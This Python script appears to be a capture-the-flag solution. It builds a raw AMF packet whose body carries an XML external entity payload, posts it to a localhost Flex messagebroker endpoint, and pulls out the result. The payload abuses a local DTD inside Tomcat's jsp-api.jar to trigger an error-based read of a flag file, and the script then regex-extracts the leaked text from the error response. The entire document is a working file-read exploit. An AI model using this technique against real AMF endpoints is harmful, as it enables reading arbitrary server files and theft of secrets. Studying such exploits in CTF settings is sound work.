import requests
import re

url = "http://localhost:1337/tetctf/messagebroker/amf"


'''
QDataStream stream(&outArray, QIODevice::WriteOnly);
stream.setByteOrder(QDataStream::BigEndian);
stream << (qint16)3; // version
stream << (qint16)0; // header count
stream << (qint16)1; // message count
stream << (qint16)3; // target length
stream << (qint32) tsu; // target 
stream << (qint16)7; // response length
stream << (qint16)deptrai; // response
stream << (qint32)data.size(); // message size
stream.writeRawData(data.data(), data.size()); // message data
'''
def genAMF(payload):
	version = '\x00\x03' # Version
	headers = '\x00\x00' # No headers
	msg_count = '\x00\x01' # sending 1 message
	packet = version + headers + msg_count

	# Set target and respond
	target = "\x00\x03tsu"
	respond = "\x00\x07deptrai"
	packet += target + respond

	# just set size message to max
	size_msg = "\xff\xff\xff\xff"
	# Start message body data
	array_one_entry = "\x0A\x00\x00\x00\x01"
	xml_type = "\x0F"
	size_and_string = "\x00\x00\x01\xAA" 
	bodies = size_msg + array_one_entry + xml_type + size_and_string + payload
	
	packet += bodies
	return packet

xml_payload = '''<!DOCTYPE message [
		<!ENTITY % local_dtd SYSTEM "jar:netdoc:///home/service/apache-tomcat-7.0.99/lib/jsp-api.jar!/javax/servlet/jsp/resources/jspxml.dtd">
		<!ENTITY % URI '(aa) #IMPLIED>
			<!ENTITY &#x25; x SYSTEM "netdoc:///home/service/flag.txt">
			<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;_:///abcxyz/&#x25;x;&#x27;>">
			&#x25;eval;
			&#x25;error;
			<!ATTLIST attxx aa "bb"'>
		%local_dtd;
	]>
	<message></message>'''

payload = genAMF(xml_payload)
r = requests.post(url, data = payload, headers = {"Content-Type": "application/x-amf"})

m = re.findall("abcxyz/(?P<flag>.*)", r.text)
print(m[0])